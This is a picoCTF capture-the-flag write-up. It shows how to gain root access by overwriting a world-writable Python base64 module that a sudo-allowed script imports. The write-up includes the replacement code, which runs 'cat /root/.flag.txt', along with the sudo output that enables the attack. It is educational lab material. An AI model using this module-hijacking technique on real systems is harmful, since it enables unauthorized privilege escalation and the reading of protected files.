# hijacking

This challenge from [picoCTF](https://play.picoctf.org/practice/challenge/352) asks us to get a root access sing a python script.

Once we connect on the remote, we can see that we have a `.server.py` file that we can run as root.

```
picoctf@challenge:~$ ls -a
.  ..  .bash_logout  .bashrc  .cache  .profile  .server.py
picoctf@challenge:~$ cat .server.py
```
```py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip)
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

We can also see that we can run this script as root

```
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

We know that the script import those modules: `os` `base64` `socket`.

Let's try to edit base64 to retrieve the flag. First, we can look where the module is located on the machine with this python script:

```py
import base64
print(base64.__file__)
```
```
picoctf@challenge:~$ python3 a.py
cat: /root/.flag.txt: Permission denied
/usr/lib/python3.8/base64.py
picoctf@challenge:~$ ll /usr/lib/python3.8/base64.py
-rwxrwxrwx 1 root root 67 Nov 28 14:14 /usr/lib/python3.8/base64.py*
```

I have no clue why it displayed the flag path but now that we know it we can replace our base64 module with this code:

```py
import os

os.system('cat /root/.flag.txt')
```

Then we can just run the script:

```
picoctf@challenge:~$ sudo  /usr/bin/python3 /home/picoctf/.server.py
picoCTF{FLAG}
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname
```